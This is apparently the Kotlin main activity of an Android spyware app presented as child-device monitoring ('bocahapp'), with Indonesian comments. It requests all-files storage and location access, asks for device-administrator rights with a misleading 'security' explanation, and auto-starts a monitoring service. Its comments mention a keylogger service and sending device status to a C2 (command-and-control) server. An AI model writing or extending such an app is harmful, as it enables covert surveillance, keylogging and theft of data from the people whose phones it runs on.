package com.sadap.bocahapp.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.sadap.bocahapp.ChildDeviceManager
import com.sadap.bocahapp.R
import com.sadap.bocahapp.receivers.AdminReceiver
import com.sadap.bocahapp.services.DataSecureService

class MainActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 100
    private val DEVICE_ADMIN_REQUEST_CODE = 101
    private lateinit var statusTextView: TextView
    private lateinit var deviceIdTextView: TextView
    private lateinit var deviceManager: ChildDeviceManager
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponentName: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusTextView = findViewById(R.id.statusTextView)
        deviceIdTextView = findViewById(R.id.deviceIdTextView)
        val startServiceButton: Button = findViewById(R.id.startServiceButton)
        val stopServiceButton: Button = findViewById(R.id.stopServiceButton)
        val enableAdminButton: Button = findViewById(R.id.enableAdminButton)
        val startChatButton: Button = findViewById(R.id.startChatButton)

        deviceManager = ChildDeviceManager(this)
        val deviceId = deviceManager.getDeviceId()
        deviceIdTextView.text = "Device ID: $deviceId"

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponentName = ComponentName(this, AdminReceiver::class.java)

        startServiceButton.setOnClickListener {
            if (checkPermissions()) {
                startDataSecureService()
            } else {
                requestPermissions()
            }
        }

        stopServiceButton.setOnClickListener {
            stopDataSecureService()
        }

        enableAdminButton.setOnClickListener {
            requestDeviceAdmin()
        }

        startChatButton.setOnClickListener {
            val chatIntent = Intent(this, ChatActivity::class.java)
            startActivity(chatIntent)
        }

        // Auto-start service jika sudah ada izin
        if (checkPermissions()) {
            startDataSecureService()
        }
        updateAdminStatusUI()
    }

    override fun onResume() {
        super.onResume()
        updateAdminStatusUI() // Update UI saat kembali ke aktivitas
        // Jika KeyloggerService ingin dipantau dari sini, tambahkan logikanya
    }

    private fun startDataSecureService() {
        val serviceIntent = Intent(this, DataSecureService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, serviceIntent)
        } else {
            startService(serviceIntent)
        }
        statusTextView.text = "Layanan pemantauan aktif."
        Toast.makeText(this, "Layanan pemantauan dimulai.", Toast.LENGTH_SHORT).show()
        Log.d("MainActivity", "DataSecureService started.")
    }

    private fun stopDataSecureService() {
        val serviceIntent = Intent(this, DataSecureService::class.java)
        stopService(serviceIntent)
        statusTextView.text = "Layanan pemantauan tidak aktif."
        Toast.makeText(this, "Layanan pemantauan dihentikan.", Toast.LENGTH_SHORT).show()
        Log.d("MainActivity", "DataSecureService stopped.")
    }

    private fun checkPermissions(): Boolean {
        val storagePermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }

        val locationPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        return storagePermission && locationPermission
    }

    private fun requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.addCategory("android.intent.category.DEFAULT")
                intent.data = Uri.parse(String.format("package:%s", applicationContext.packageName))
                startActivityForResult(intent, PERMISSION_REQUEST_CODE)
            } catch (e: Exception) {
                val intent = Intent()
                intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
                startActivityForResult(intent, PERMISSION_REQUEST_CODE)
            }
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    private fun requestDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponentName)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Admin perangkat diperlukan untuk fitur keamanan seperti penguncian data dan pemantauan perangkat.")
        startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
    }

    private fun updateAdminStatusUI() {
        val isAdminActive = devicePolicyManager.isAdminActive(adminComponentName)
        findViewById<TextView>(R.id.adminStatusTextView).text = "Status Admin: ${if (isAdminActive) "Aktif" else "Tidak Aktif"}"
        val enableAdminButton: Button = findViewById(R.id.enableAdminButton)
        enableAdminButton.isEnabled = !isAdminActive
        // Kirim status ke C2 dari sini atau dari AdminReceiver saat onEnabled/onDisabled
        val serviceIntent = Intent(this, DataSecureService::class.java)
        serviceIntent.putExtra("action", "UPDATE_ADMIN_STATUS")
        startService(serviceIntent) // Ini akan memicu DataSecureService untuk mengirim update ke C2
    }


    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (checkPermissions()) {
                Toast.makeText(this, "Izin diberikan.", Toast.LENGTH_SHORT).show()
                startDataSecureService()
            } else {
                Toast.makeText(this, "Izin ditolak, layanan tidak dapat berjalan.", Toast.LENGTH_LONG).show()
                statusTextView.text = "Layanan membutuhkan izin penyimpanan dan lokasi."
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "Izin diberikan.", Toast.LENGTH_SHORT).show()
                    startDataSecureService()
                } else {
                    Toast.makeText(this, "Izin ditolak, layanan tidak dapat berjalan.", Toast.LENGTH_LONG).show()
                    statusTextView.text = "Layanan membutuhkan izin penyimpanan."
                }
            }
        } else if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Admin perangkat diaktifkan.", Toast.LENGTH_SHORT).show()
                updateAdminStatusUI()
            } else {
                Toast.makeText(this, "Gagal mengaktifkan admin perangkat.", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
